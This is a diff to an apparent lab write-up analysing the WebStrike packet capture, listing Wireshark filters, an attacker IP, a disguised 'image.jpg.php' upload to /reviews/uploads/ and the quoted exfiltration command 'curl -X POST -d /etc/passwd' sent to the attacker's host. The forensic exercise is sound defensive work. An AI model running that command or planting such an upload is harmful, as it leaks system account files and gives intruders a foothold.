@@ -20,6 +20,17 @@ Task is to analyze the provided PCAP file to uncover how the file appeared and d
 
 ## Steps:
 
+1. Navigate to the WebStrike.PCAP file that was captured.  *Ref 1: WebStrike.PCAP file
+2. Perform an IPv4 Address Lookup of ---| 117.11.88.124 |. 
+3. Identify the User-Agent ---| Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 |.
+4. Create a filter for Wireshark ---| (ip.src == 117.11.88.124 and http.request.method=="POST") |.
+5. Identify any successful uploads ---| "image.jpg.php" uploaded successfully |.
+6. Locate the file location of the uploaded file ---| /reviews/uploads/ |.
+7. Identify the targeted Port used for infiltration ---| Port 8080 |.
+8. Create a filter for Wireshark ---| (tcp.port==8080) && (ip.src==24.49.63.79) |.
+9. Identify the commands used for exfiltration ---| "curl" "curl -X POST -d /etc/passwd 117.11.88.124:443" |.
+10. Identified the critical information containing sensitive user configuration data.
+
 drag & drop screenshots here or use imgur and reference them using imgsrc
 
 Every screenshot should have some text explaining what the screenshot is about.
@@ -40,6 +51,6 @@ Example below.
 - Uploaded file found in /reviews/uploads/
 - Port 8080 targeted
 - Filter for wire shark ---- | (tcp.port==8080) && (ip.src==24.49.63.79) |
-- Attacker used "curl" "curl -X POST -d /etc/passwd http://117.11.88.124:443/"
+- Attacker used "curl" "curl -X POST -d /etc/passwd 117.11.88.124:443/"
 - Shows exfiltration of critical information containing sensitive user configuration data.
 - 
